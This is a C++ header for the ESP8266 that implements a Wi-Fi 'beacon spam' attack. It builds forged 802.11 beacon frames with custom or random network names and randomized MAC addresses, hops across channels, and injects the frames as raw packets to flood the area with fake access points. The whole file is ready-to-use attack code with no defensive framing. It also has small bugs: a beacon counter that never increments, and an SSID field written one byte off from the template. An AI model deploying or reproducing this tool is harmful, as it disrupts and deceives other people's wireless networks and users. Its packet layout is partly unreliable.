#ifndef BEACON_SPAM_H
#define BEACON_SPAM_H

#include <ESP8266WiFi.h>
#include <vector>

class BeaconSpamAttack {
private:
    bool running = false;
    std::vector<String> customSSIDs;
    unsigned long lastBeaconTime = 0;
    unsigned long beaconInterval = 100;
    uint8_t maxSSIDs = 20;
    uint8_t currentChannel = 1;
    unsigned long lastChannelSwitch = 0;
    const unsigned long CHANNEL_HOP_INTERVAL = 500;
    bool channelHopping = true;
    
    // Beacon packet template
    uint8_t beaconPacket[109] = {
        0x80, 0x00,                         // Frame Control
        0x00, 0x00,                         // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
        0x64, 0x00,                         // Beacon Interval
        0x31, 0x04,                         // Capability Info
        0x00                                // SSID Parameter
    };

public:
    void begin() {
        WiFi.mode(WIFI_AP_STA);
        wifi_set_opmode(STATION_MODE);
    }

    void setInterval(unsigned long interval) {
        beaconInterval = constrain(interval, 100, 1000);
    }

    void setMaxSSIDs(uint8_t max) {
        maxSSIDs = constrain(max, 1, 50);
    }

    void setChannelHopping(bool enabled) {
        channelHopping = enabled;
    }

    void addSSID(String ssid) {
        if (customSSIDs.size() < maxSSIDs && ssid.length() <= 32) {
            customSSIDs.push_back(ssid);
        }
    }

    void addRandomSSID() {
        if (customSSIDs.size() >= maxSSIDs) return;
        
        const char charset[] = "0123456789"
                             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                             "abcdefghijklmnopqrstuvwxyz";
        
        int length = random(8, 15);
        String ssid;
        
        for (int i = 0; i < length; i++) {
            ssid += charset[random(0, sizeof(charset) - 1)];
        }
        
        customSSIDs.push_back(ssid);
    }

    void clearSSIDs() {
        customSSIDs.clear();
    }

    void start() {
        if (customSSIDs.empty()) {
            // Add some random SSIDs if none are set
            for (int i = 0; i < 10; i++) {
                addRandomSSID();
            }
        }
        
        running = true;
        lastBeaconTime = millis();
        lastChannelSwitch = millis();
        wifi_promiscuous_enable(1);
    }

    void stop() {
        running = false;
        wifi_promiscuous_enable(0);
    }

    void update() {
        if (!running) return;

        unsigned long currentTime = millis();
        
        // Handle channel hopping
        if (channelHopping && currentTime - lastChannelSwitch >= CHANNEL_HOP_INTERVAL) {
            currentChannel = (currentChannel % 13) + 1;
            wifi_set_channel(currentChannel);
            lastChannelSwitch = currentTime;
        }

        // Send beacons
        if (currentTime - lastBeaconTime >= beaconInterval) {
            for (const String& ssid : customSSIDs) {
                sendBeacon(ssid);
            }
            lastBeaconTime = currentTime;
        }
    }

    String getStatus() {
        String status = "Beacon Spam:\n";
        status += "SSIDs: " + String(customSSIDs.size()) + "\n";
        status += "Channel: " + String(currentChannel) + "\n";
        status += "Interval: " + String(beaconInterval) + "ms";
        return status;
    }

    uint32_t getBeaconCount() const { return beaconCount; }

private:
    uint32_t beaconCount = 0;

    void sendBeacon(const String& ssid) {
        // Create packet
        uint8_t packet[200];
        memcpy(packet, beaconPacket, sizeof(beaconPacket));
        
        // Randomize MAC address
        for (int i = 10; i < 16; i++) {
            packet[i] = random(256);
            packet[i + 6] = packet[i];
        }
        
        // Set SSID
        uint8_t ssidLen = ssid.length();
        packet[37] = 0x00; // SSID parameter number
        packet[38] = ssidLen; // SSID length
        memcpy(&packet[39], ssid.c_str(), ssidLen);
        
        // Add supported rates
        packet[39 + ssidLen] = 0x01; // Supported rates parameter number
        packet[40 + ssidLen] = 0x08; // Supported rates length
        packet[41 + ssidLen] = 0x82; // 1 Mbps
        packet[42 + ssidLen] = 0x84; // 2 Mbps
        packet[43 + ssidLen] = 0x8B; // 5.5 Mbps
        packet[44 + ssidLen] = 0x96; // 11 Mbps
        packet[45 + ssidLen] = 0x24; // 18 Mbps
        packet[46 + ssidLen] = 0x30; // 24 Mbps
        packet[47 + ssidLen] = 0x48; // 36 Mbps
        packet[48 + ssidLen] = 0x6C; // 54 Mbps

        // Add channel information
        packet[49 + ssidLen] = 0x03; // Channel parameter number
        packet[50 + ssidLen] = 0x01; // Channel length
        packet[51 + ssidLen] = currentChannel; // Current channel
        
        uint16_t packetSize = 52 + ssidLen;
        wifi_send_pkt_freedom(packet, packetSize, 0);
        delay(1);
    }
};

#endif 